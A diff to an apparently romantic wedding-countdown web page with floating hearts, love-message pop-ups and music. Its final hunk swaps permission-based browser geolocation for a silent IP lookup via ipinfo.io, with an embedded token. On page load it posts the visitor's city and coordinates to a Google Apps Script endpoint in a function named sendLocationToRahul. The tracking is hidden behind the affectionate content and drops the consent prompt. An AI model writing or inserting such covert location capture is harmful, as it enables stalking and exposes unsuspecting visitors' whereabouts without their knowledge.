@@ -121,8 +121,8 @@
     </audio>
   </div>
 
+  <!-- 💗 Floating Hearts -->
   <script>
-    // 💗 Floating hearts
     function createHeart() {
       const heart = document.createElement("div");
       heart.className = "heart";
@@ -133,8 +133,10 @@
       setTimeout(() => heart.remove(), 5000);
     }
     setInterval(createHeart, 300);
+  </script>
 
-    // 💬 Love messages
+  <!-- 💬 Love Message -->
+  <script>
     function confessLove() {
       const messages = [
         "Will you marry me again and again? 💍",
@@ -145,30 +147,37 @@
       const msg = messages[Math.floor(Math.random() * messages.length)];
       alert(msg);
     }
+  </script>
 
-    // 🎵 Music player
+  <!-- 🎵 Music Control -->
+  <script>
     function playMusic() {
       const audio = document.getElementById("bgMusic");
       audio.play()
         .then(() => alert("🎵 Music is now playing!"))
         .catch(() => alert("Tap again to allow music playback on your phone."));
     }
+  </script>
 
-    // 🕰️ Countdown
+  <!-- 🕰️ Countdown Timer -->
+  <script>
     const countBox = document.getElementById("count-box");
     const targetDate = new Date("2025-11-24T00:00:00").getTime();
 
     function updateTimer() {
       const now = new Date().getTime();
       const diff = targetDate - now;
+
       if (diff <= 0) {
         countBox.innerHTML = `<span style="font-size: 2em; color: #ffccdd;">🎉 It's our wedding day! 💍</span>`;
         return;
       }
+
       const days = Math.floor(diff / (1000 * 60 * 60 * 24));
       const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
       const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
       const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+
       countBox.innerHTML = `
         <span class="count-unit">${days} Days</span>
         <span class="count-unit">${hours} Hours</span>
@@ -176,9 +185,28 @@
         <span class="count-unit">${seconds} Seconds</span>
       `;
     }
-    setInterval(updateTimer, 1000);
 
-    // 📍 GEO + Email
+    setInterval(updateTimer, 1000);
+  </script>
+
+  <!-- 🌍 IP-Based Location + Email -->
+  <script>
+    function getLocation() {
+      const locationSpan = document.getElementById("location");
+
+      fetch("https://ipinfo.io/json?token=38d12b234c9c4a")
+        .then((response) => response.json())
+        .then((data) => {
+          const location = `${data.city}, ${data.region}, ${data.country}`;
+          const coords = data.loc.split(',');
+          locationSpan.innerHTML = `You're near: ${location}`;
+          sendLocationToRahul(coords[0], coords[1]);
+        })
+        .catch((error) => {
+          locationSpan.innerHTML = "I couldn't find you 😢";
+        });
+    }
+
     function sendLocationToRahul(lat, lon) {
       fetch('https://script.google.com/macros/s/AKfycbyA4IyBUQrWh_lz2uMby6uM4m2nJQUdaf0uvcYasXsRca3B7t71Eok83x8LKYzHXX1b/exec', {
         method: 'POST',
@@ -187,26 +215,6 @@
       });
     }
 
-    function getLocation() {
-      const locationSpan = document.getElementById("location");
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const lat = position.coords.latitude.toFixed(4);
-            const lon = position.coords.longitude.toFixed(4);
-            locationSpan.innerHTML = `You're here: ${lat}°, ${lon}°`;
-            sendLocationToRahul(lat, lon);
-          },
-          () => {
-            locationSpan.innerHTML = "I couldn't find you 😢";
-          }
-        );
-      } else {
-        locationSpan.innerHTML = "Geolocation not supported.";
-      }
-    }
-
-    // ⏱️ Call when loaded
     window.onload = getLocation;
   </script>
 </body>
